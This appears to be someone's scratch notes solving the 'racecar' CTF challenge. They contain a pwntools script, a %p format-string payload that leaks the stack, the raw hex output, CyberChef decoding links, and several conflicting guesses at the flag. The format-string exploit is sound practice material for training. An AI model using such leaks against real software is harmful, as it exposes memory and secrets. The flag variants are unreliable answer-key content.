from pwn import *
p = process("./racecar")
def go_to_end():
    p.sendline("Name")
    p.recv()
    p.sendline("Nickname")
    p.recv()
    p.sendline("2")
    p.recv()
    p.sendline("1")
    p.recv()
    p.sendline("2")
    p.recv()
go_to_end()
p.sendline("%p")

%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p

0x56dc81c00x1700x565aad85(nil)0x560x260x10x20x565ab96c0x56dc81c00x56dc83400x7b4254480x5f7968770x5f6431640x34735f310x745f33760x665f33680x5f67346c0x745f6e300x355f33680x6b6334740x7d213f0x71bae4000xf7f123fc0x565adf8c0xfff7d3680x565ab4410x10xfff7d4140xfff7d41c0x71bae4000xfff7d380(nil)(nil)0xf7d55f210xf7f120000xf7f12000(nil)0xf7d55f210x10xfff7d4140xfff7d41c0xfff7d3a40x10xfff7d4140xf7f120000xf7f2f70a0xfff7d410(nil)0xf7f12000(nil)(nil)0x95d13a4e0xd0cbfc5e(nil)(nil)(nil)0x400xf7f47024(nil)(nil)0xf7f2f8190x565adf8c0x10x565aa790(nil)0x565aa7c10x565ab3e10x1


578d11c017056631d8594926125663296c578d11c0578d1340 — -FLAG: 0x7b4254480x5f7968770x5f6431640x34735f310x745f33760x665f33680x5f67346c0x745f6e300x355f33680x6b6334740x7d213f — -

https://cyberchef.cybertap.ch/#recipe=Find_/_Replace(%7B'option':'Regex','string':'%5C%5C(nil%5C%5C)'%7D,'',true,false,true,false)From_Hex('Auto')Swap_endianness('Hex',4,true/disabled)&input=NDggNTQgNDIgN2IgNzcgNjggNzkgNWYgNjQgMzEgNjQgNWYgMzEgNWYgNzMgMzQgNzYgMzMgNWYgNzQgNjggMzMgNWYgNjYgNmMgMzQgNjcgNWYgMzAgNmUgNWYgNzQgNjggMzMgNWYgMzUgNzQgMzQgNjMgNmIgMDAgMDAgMDAgN2Q

https://cyberchef.cybertap.ch/#recipe=Find_/_Replace(%7B'option':'Regex','string':'%5C%5C(nil%5C%5C)'%7D,'',true,false,true,false)Swap_endianness('Hex',4,true)From_Hex('Auto')&input=MHg3YjQyNTQ0ODB4NWY3OTY4NzcweDVmNjQzMTY0MHgzNDczNWYzMTB4NzQ1ZjMzNzYweDY2NWYzMzY4MHg1ZjY3MzQ2YzB4NzQ1ZjZlMzAweDM1NWYzMzY4MHg2YjYzMzQ3NDB4N2QyMTNmMHg3MWJhZTQwMDB4ZjdmMTIzZmMweDU2NWFkZjhjMHhmZmY3ZDM2ODB4NTY1YWI0NDEweDEweGZmZjdkNDE0MHhmZmY3ZDQxYzB4NzFiYWU0MDAweGZmZjdkMzgwKG5pbCkobmlsKQoweGY3ZDU1ZjIxMHhmN2YxMjAwMDB4ZjdmMTIwMDAobmlsKTB4ZjdkNTVmMjEweDEweGZmZjdkNDE0MHhmZmY3ZDQxYzB4ZmZmN2QzYTQweDEweGZmZjdkNDE0MHhmN2YxMjAwMDB4ZjdmMmY3MGEweGZmZjdkNDEwKG5pbCkweGY3ZjEyMDAwKG5pbCkobmlsKTB4OTVkMTNhNGUweGQwY2JmYzVlKG5pbCkobmlsKShuaWwpMHg0MDB4ZjdmNDcwMjQobmlsKShuaWwpMHhmN2YyZjgxOTB4NTY1YWRmOGMweDEweDU2NWFhNzkwKG5pbCkweDU2NWFhN2MxMHg1NjVhYjNlMTB4MQ

https://karol-mazurek95.medium.com/pwn-racecar-challenge-htb-80aad2b930be

HTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ckq?!}
HTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck...}
HTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck}
HTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}